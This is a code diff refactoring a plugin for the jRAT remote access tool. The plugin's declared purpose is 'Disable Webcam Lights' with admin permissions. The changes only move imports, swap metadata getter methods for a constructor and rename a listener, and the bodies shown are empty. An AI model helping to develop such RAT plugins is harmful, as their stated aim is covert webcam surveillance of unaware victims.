@@ -7,8 +7,6 @@ import java.util.List;
 
 import javax.swing.ImageIcon;
 
-import jrat.api.RATControlMenuEntry;
-import jrat.api.RATMenuItem;
 import jrat.api.RATPlugin;
 import jrat.api.events.OnConnectEvent;
 import jrat.api.events.OnDisableEvent;
@@ -16,6 +14,8 @@ import jrat.api.events.OnDisconnectEvent;
 import jrat.api.events.OnEnableEvent;
 import jrat.api.events.OnPacketEvent;
 import jrat.api.events.OnSendPacketEvent;
+import jrat.api.ui.RATControlMenuEntry;
+import jrat.api.ui.RATMenuItem;
 
 public class DWLPlugin extends RATPlugin {
 
@@ -28,6 +28,10 @@ public class DWLPlugin extends RATPlugin {
 	public static RATControlMenuEntry entry;
 	public static boolean enabled;
 	
+	public DWLPlugin() {
+		super("Disable Webcam Lights", "1.0", "Disables some webcam lights, requires admin permissions", "Anonmoosekaab");
+	}
+	
 	public void onEnable(OnEnableEvent event) throws Exception {
 		
 	}
@@ -39,23 +43,7 @@ public class DWLPlugin extends RATPlugin {
 	public void onPacket(OnPacketEvent event) throws Exception {
 		
 	}
-
-	public String getName() {
-		return "Disable Webcam Lights";
-	}
-
-	public String getVersion() {
-		return "1.0";
-	}
-
-	public String getDescription() {
-		return "Disables some webcam lights, requires admin rights";
-	}
-
-	public String getAuthor() {
-		return "Anonmoosekaab";
-	}
-
+	
 	// Server connected to us
 	public void onConnect(OnConnectEvent event) throws Exception {
 
@@ -86,7 +74,7 @@ public class DWLPlugin extends RATPlugin {
 	}
 
 	@Override
-	public ActionListener getGlobalMenuItemListener() {
+	public ActionListener getGlobalActionListener() {
 		return null;
 	}
 
